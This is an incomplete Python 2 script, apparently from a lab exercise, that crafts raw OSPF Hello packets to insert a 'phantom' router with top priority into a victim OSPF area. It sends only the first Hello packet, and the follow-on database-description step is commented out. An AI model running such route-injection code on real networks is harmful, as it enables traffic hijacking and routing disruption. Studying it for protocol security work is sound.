#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys

from modules.ip import IP
from modules.ethernet import Ethernet
from modules.ospf import *

# Interface
IF_NAME = 'wlp3s0'

# Identificador do roteador fantasma
PHANTON_ID = '2.2.2.2'
# area configurada no roteador OSPF vitima 
AREA_ID = '3.3.3.3'

# intervalo de 20 segundos
HELLO_INTERVAL = 20
# Prioridade alta para eleição do master
ROUTER_PRIORITY = 0xff
ROUTER_DEAD_INTERVAL = 40

# Ip do roteador fantasma
DEISGNATED_ROUTER = '192.168.0.70'

BKP_ROUTER = '0.0.0.0'

# neighbors - roteadores vítimas
PHANTON_ROUTER_IP = '192.168.0.40'

def hello_packet(ospf):
    hello_data = ospf.hello_packet('255.255.255.0',
                                    HELLO_INTERVAL,
                                    0x00,
                                    ROUTER_PRIORITY,
                                    ROUTER_DEAD_INTERVAL,
                                    DEISGNATED_ROUTER,
                                    BKP_ROUTER,
                                    PHANTON_ROUTER_IP)
    hello_size = len(hello_data)

    ip = IP('192.168.0.66', '224.0.0.0', hello_size)
    ethernet_packet = Ethernet('ff:ff:ff:ff:ff:ff', 'ff:ff:ff:ff:ff:ff')

    # OSPF em cima de IP, que é em cima de Ethernet
    return ethernet_packet.raw_format() + ip.raw_format() + hello_data




def main():
    """
    Main Method
    """
    try:
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((IF_NAME, 0))
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    ospf = OSPF(PHANTON_ID, AREA_ID)
    # Envia hello com a informação da vítima
    s.send(hello_packet(ospf))
    
    # Vazio, apenas com flag de inicialização, flag de mestre, flag MS(more segments, vai mandar mais segmentos)
    # tem q incluir um nro de sequencia inicial
    #for i in range (0,5):
        # tem q incluir o nro de sequencia, que vai ser o i
    #    db_desc_package = ...
    #    s.send(db_desc_package)

    
    
    



if __name__ == '__main__':
    main()
